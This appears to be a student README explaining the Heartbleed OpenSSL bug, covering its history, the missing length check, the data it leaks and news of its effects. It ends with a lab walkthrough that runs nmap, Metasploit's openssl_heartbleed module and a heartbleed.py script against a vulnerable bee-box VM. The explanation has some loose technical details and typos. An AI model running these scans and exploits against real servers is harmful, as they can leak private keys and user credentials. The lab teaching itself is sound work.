# Heartbleed Exploit on OpenSSL  (CVE 2014-0160)

## What is Heartbleed Exploit
### Why is this exploit called Heartbleed?

* It is named after the extension protocol which SSL/TLS protocols used called Heartbeat Extension

* While TLS handshaking it sends packet called heartbeat packet to another system to keep TLS connection up every time so that it save time that initialization of TLS take. It sends it multiple time nonstop.

### Why It Happens?

* There is programming mistake in OpenSSL Library called libssl which handles the execution of SSL/TSL protocol

### How Big it is?

* OpenSSL is mostly used by opensource webservers like Apache and nginx. So combined market share of just these on inter is 66% as per [Netcraft's April 2014 Web Server Survey](https://news.netcraft.com/archives/2014/04/02/april-2014-web-server-survey.html)[1]

### Who found it?

* It was found by group of security engineers while working on SafeGuard feature in Codenomicon's Defensics [security testing tools](https://www.synopsys.com/software-integrity/security-testing.html) [2]

* They reported this bug to NCSC-FI(National Cyber Security Center Finland) to take further action and tell OpenSSL

* 3rd of April 2014, [NCSC-FI](https://www.kyberturvallisuuskeskus.fi/en) [3] took up the task of verifying it, analyzing it further and reaching out to the authors of OpenSSL, software, operating system and appliance vendors, which were potentially affected.

### What versions are affected?

* Bug was introduced to OpenSSL in December 2011 and has been out in the wild since

* OpenSSL release 1.0.1 on 14th of March 2012.

### Is it is Solved Now?

* OpenSSL 1.0.1g released on 7th of April 2014 fixes the bug

## How Heartbleed Exploit  Works

* Normally the system sends the heatbeat extension packet of 65536 bytes with some payload to another system to keep TLS connection active . In return another system send back same payload with some padding. This packet goes to and fro multiple time just to keep TSL active to save time taken by TLS to initialise so that fast communication can be done.
![alt text](https://raw.githubusercontent.com/95keshav/openssl/main/heartbleed.png)
* But there is flow in the code of OpenSSL it does not check the lenght of packet.
![alt text](https://raw.githubusercontent.com/95keshav/openssl/main/heartbleed_hacked.png)
* Hackers use this flow to exploit the packet, They send packet with just 1 byte of data and keep other bytes empty, System do not confirm the lenght and save it in memory. When System sends back response it does not know that packet size was only of 1 byte. and it copy 65536 bytes from memory and sent back to hacker
* That data from memroy may contain SSL private keys, User credentials, System Memory address.
[To Get more information on Heartbleed click here](https://www.youtube.com/watch?v=WgrBrPW_Zn4)

## What Data is being leaked?
* Data being leaked comes under 4 categories

	1. Primary Key material

		* Encryption keys

	2. Secondary Key  material

		* Username and  Password

	3. Protected content

		* Financial Data

		* Private Communication e.g. email

		* Documents worth protected

	4. Collateral

		* Leaked  Memory  Content

		* Memory Addresses

		* Security measures  used  e.g. canaries used for overflow



## Affects of Heartbleed Exploit
1. [Millions of Vulnerable Systems Unpatched for Severe Bugs Including BlueKeep and Heartbleed Despite NSA Warnings](https://www.cpomagazine.com/cyber-security/millions-of-vulnerable-systems-unpatched-for-severe-bugs-including-bluekeep-and-heartbleed-despite-nsa-warnings/)
2. [Heartbleed bug crisis hit more government computers than previously disclosed](https://www.cbc.ca/news/politics/heartbleed-bug-cyberattack-canada-government-departments-1.3355993)
3. [900 SINs stolen due to Heartbleed bug: Canada Revenue Agency](https://globalnews.ca/news/1269168/900-sin-numbers-stolen-due-to-heartbleed-bug-canada-revenue-agency/)
4. [Devastating Heartbleed Flaw Was Used in Hospital Hack](https://time.com/3148773/report-devastating-heartbleed-flaw-was-used-in-hospital-hack/)
5. [Heartbleed](https://heartbleed.com/)



### OpenSSL Heartbleed Exploit



#### Tools needed

1. A bee-box virtual machine with OpenSSL in version 1.0.1~1.0.2  provided by bWAPP     

   [Download URL](https://sourceforge.net/projects/bwapp/files/bee-box/)

   **bWAPP and bee-box**: bWAPP is short for buggy web application, it allows us to implement penetration testing and ethical hacking projects. Over 100 web bugs are covered which include all major web vulnerabilities. The bee-box is the vulnerable virtual machine provided by bWAPP that can be used for CVE exploits.

2. A Kali-Linux virtual machine（Nmap；Metasploit；Python script）

   [Download URL](https://www.kali.org/downloads/)
   
   **Kali-Linux**: Kali-Linux is a kind of Debian Linux which is widely used in ethical hacking. It has hundreds of pre-installed ethical hacking tools. In this presentation, we will use it to hack the vulnerable bee-box.
   
   **Nmap**: Nmap is short for Network Mapper, it is an open-source network scanner started by Gordon Lyon. Nmap is a tool for probing computer networks and it is able to detect vulnerabilities.
   
   **Metasploit**: Metasploit is a well-known tool deals with computer security, it provides numerous methodologies for vulnerability exploitation. In this presentation, we will use it to execute the exploit of heartbleed vulnerability.
   
   

#### Method 1：

1. Open the 2 virtual machines.

2. Use ifconfig command to check the IP address of the bee-box.

3. Use Nmap tool in Kali-Linux to check the heartbleed vulnerability in the bee-box.

~~~
nmap -sV -p 8443 --script ssl-heartbleed.nse 192.168.2.130
~~~

4. Enter the Metasploit tool in Kali-Linux.

~~~
msfconsole
~~~

5. Search the auxiliary of heartbleed cve in Metasploit.

~~~
search cve-2014-0160
~~~

6. Pick the OpenSSL heartbleed auxiliary and use it.

~~~
use auxiliary/scanner/ssl/openssl_heartbleed
~~~

7. Set target host and port, and set verbose true to make the process seen, then exploit.

~~~
set RHOST 192.168.2.130
~~~

~~~
set RPORT 8443
~~~

~~~
set verbose true
~~~

~~~
exploit
~~~



#### Method 2:

1. Open the 2 virtual machines.

2. Use ifconfig command to check the IP address of the bee-box.

3. Use vim command to create a script  [heartbleed.py](https://github.com/ctfs/write-ups-2014/blob/master/plaid-ctf-2014/heartbleed/heartbleed.py) in Kali-Linux  in Kali-Linux.

4. Ran the script.

   ~~~
   python heartbleed.py 192.168.2.130 -p 8443
   ~~~

   

### References:
[1] Netcraft's April 2014 Web Server Survey, https://news.netcraft.com/archives/2014/04/02/april-2014-web-server-survey.html.

[2] Application Security and Quality Analysis Tools, https://www.synopsys.com/software-integrity/security-testing.html.

[3] NCSC-FI, https://www.kyberturvallisuuskeskus.fi/en,https://news.netcraft.com/archives/2014/04/02/april-2014-web-server-survey.html.

[4] Heartbleed bug News, https://heartbleed.com/.

[5] Heartbleed bug News, https://heartbleed.com/.

[6] Heartbleed bug News, https://heartbleed.com/.![image](https://user-images.githubusercontent.com/52240576/111923122-ed2db580-8a73-11eb-8305-ed1cb52efffe.png)

[7] Hacking Tools, https://www.concise-courses.com/hacking-tools/

[8] Exploitation Turtorial, https://www.youtube.com/watch?v=SgJm0C6jzbo&t=47s

[9] Heartbleed script, https://github.com/ctfs/write-ups-2014/blob/master/plaid-ctf-2014/heartbleed/heartbleed.py

[10] bWAPP, https://sourceforge.net/projects/bwapp/files/bee-box/

[11] Kali-Linux, https://www.kali.org

[12] Metasploit, https://en.wikipedia.org/wiki/Metasploit_Project

[13] Nmap, https://en.wikipedia.org/wiki/Nmap

